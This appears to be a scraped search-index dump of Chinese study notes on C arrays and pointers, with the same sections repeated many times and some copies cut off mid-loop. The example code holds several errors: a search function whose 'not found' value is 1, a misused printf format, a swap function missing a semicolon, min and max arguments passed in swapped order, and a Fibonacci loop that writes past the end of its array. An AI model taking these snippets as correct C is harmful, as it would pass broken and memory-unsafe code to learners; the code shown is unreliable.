有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#定义数组"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组是什么"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#int-a10"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的单元"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#有效的下标范围"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#统计0-9之间的数字输入的次数"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i\u003clength ;i++ ){ b[i] = a [i]; } 数组查找 #include \u003cstdio.h\u003e int search(int key, int a[], int length); int main() { int a[] = { 1,2,3,4,5,56,5,5,6,8 }; int x; int loc; printf(\"请输入一个数字：\"); scanf_s(\"%d\", \u0026x); loc = search(x, a, sizeof(a) / sizeof(a[0])); if (loc != -1) { printf(\"%d在第%d个位置上\\n\", x, loc+1); } else { printf(\"%%d不存在\\n\", x); return 0; } } int search(int key, int a[], int length){ int ret = 1; int i; for (i = 0; i \u003clength; i++) { if (a[i] == key) { ret = i; break; } } return ret; } 计算斐波那契数列 #include\u003cstdio.h\u003e #define MAXN 46 int main(){ int i,n; int fib[MAXN]={1,1}; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); if(n\u003e=1\u0026\u0026n\u003c=46){ for(i=2;i\u003c=n;i++){ fib[i]=fib[i-1]+fib[i-2]; } for(i=1;i\u003c=n;i++){ printf(\"%6d\",fib[i-1]); if(i%5==0){ printf(\"\\n\"); } } }else{ printf(\"Invalid Value!\\n\"); } return 0; } 查找数组中最小值及其下标 #include\u003cstdio.h\u003e #define MAXN 10 int main(){ int i,index,n; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } index=0; for(i=1;i\u003cn;i++){ if(a[i]\u003ca[index]){ index=i; } } printf(\"min is %d \\t sub is %d\\n\",a[index],index); return 0; } 二维数组 int a[3][5]; 通常理解为a是一个3行5列的矩阵 二维数组的元素在内存存放：(按照行优先的方式存放)先存放第0行元素，再存放第1行元素…….. 二维数组遍历 for (i=0;i\u003c3;i++){ for (j=0;j\u003c5;j++){ a[i][j] = i*j; } } 二维数组的初始化 int a[][5] = { {0,1,2,3,4}, {2,3,4,5,6}, }; 列数是必须给出的，行数可以由编译器来数 每行一个{}，逗号分隔 最后的逗号可以存在 如果省略，表示补零 找出矩阵中最大值 #include\u003cstdio.h\u003e #define MAXM 6 #define MAXN 6 int main(){ int n,m,col,i,j,row; int a[MAXM][MAXN]; printf(\"Enter m,n:\"); scanf(\"%d %d\",\u0026m,\u0026n); printf(\"Enter %d characters:\\n\",m*n); for(i=0;i\u003cm;i++){ for(j=0;j\u003cn;j++){ scanf(\"%d\",\u0026a[i][j]); } } row=col=0; for(i=0;i\u003cm;i++){ for(j=0;j\u003cn;j++){ if(a[i][j]\u003ea[row][col]){ row=i; col=j; } } } printf(\"max=a[%d][%d]=%d\\n\",row,col,a[row][col]); return 0; } 判断回文 #include\u003cstdio.h\u003e #define MAXLINE 80 int main(){ int i,k; char line[MAXLINE]; printf(\"Enter a string:\"); k=0; while((line[k]=getchar())!='\\n'){ k++; } line[k]='\\0'; i=0; k=k-1; while(i\u003ck){ if(line[i]!=line[k]){ break; } i++; k--; } if(i\u003e=k){ printf(\"Palindrome\\n\"); }else{ printf(\"Not a Palindrome\\n\"); } return 0; } 以下方法更简洁 #include \u003cstdio.h\u003e int main() { int max=80; int k=0; char a[max]; scanf(\"%d\",\u0026k); while((a[k]=getchar())!='\\n'){ k++; } a[k]='\\0'; k=k-1; int i=0; while(i\u003ck){ if(a[i]!=a[k]){ printf(\"not\"); return 0; } i++; k--; } printf(\"yes\"); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#82数组运算"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的集成初始化"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#集成初始化时的定位"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的大小"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的赋值"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#遍历数组"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组查找"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#计算斐波那契数列"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#查找数组中最小值及其下标"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二维数组"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二维数组遍历"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#二维数组的初始化"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#找出矩阵中最大值"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#判断回文"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include \u003cstdio.h\u003e void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i\u003cn;++i){ s+=a[i]; } return s; } 数组变量是特殊的指针数组变量本身表达地址 int a[10]; int*p=a; //无需用\u0026取地址 数组的单元表达的是变量，需要用\u0026取地址 a == \u0026a[0] []运算符可以对数组做，也可以对指针做 p[0] \u003c==\u003e a[o] *运算符可以对指针做，也可以对数组做 数组变量是const的指针，所以不能被赋值 int a[] \u003c==\u003e int * const a = 指针、数组和地址间的关系数组的基地址是在内存中存储数组的起始位置，是数组中第一个元素的地址 数组名的值是一个特殊的固定地址，可以看作是指针常量，不是变量，不能对其进行赋值操作 下面两条语句是等价的： p=a; p=\u0026a[0]; 同时下面两条语句也是等价的： p=a+1; p=\u0026a[1]; 通过指针实现数组求和e.g.输入正整数n，再输入，n个整数作为数组元素，分别使用数组和指针来计算并输出他们的和 #include\u003cstdio.h\u003e int main(){ int n,i; int a[10]; int *p; int sum1=0,sum2=0; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); printf(\"Enter %d integers:\",n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } for(p=a;p\u003ca+n;p++){ sum2=sum2+*p; } for(i=0;i\u003cn;i++){ sum1=sum1+*(a+i); } printf(\"Calculated by arry:%d\\n\",sum1); printf(\"Calculated by pointer:%d\\n\",sum2); return 0; } 通过以下方法也可以实现数组求和 p=a; sum=0; for(i=0;i\u003c100;i++){ sum+=p[i]; } 通过指针计算数组元素个数和数组元素的储存单元数 #include\u003cstdio.h\u003e int main(){ double a[2],*p,*q; p=\u0026a[0]; q=p+1; printf(\"%d\\n\",q-p); printf(\"%d\\n\", (int)q-(int)p); return 0; } 指针是const表示一旦得到了某个变量的地址，不能再指向其他变量 int * const q = \u0026i; //q 是const *q = 26 ; //OK q++ ; //ERROE const数组 const int a[] = {1,2,3,4,5,6}; ​ 数组变量已经是const的指针了，这里的const表明数组的每个单元都是const int ​ 所以必须通过初始化进行赋值 保护数组值因为把数组传入函数时传递的是地址，所以那个函数内部可以修改数组的值 为了保护数组不被函数破坏，可以设置参数为const int sum (const int a[] , int length ); ","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#91指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 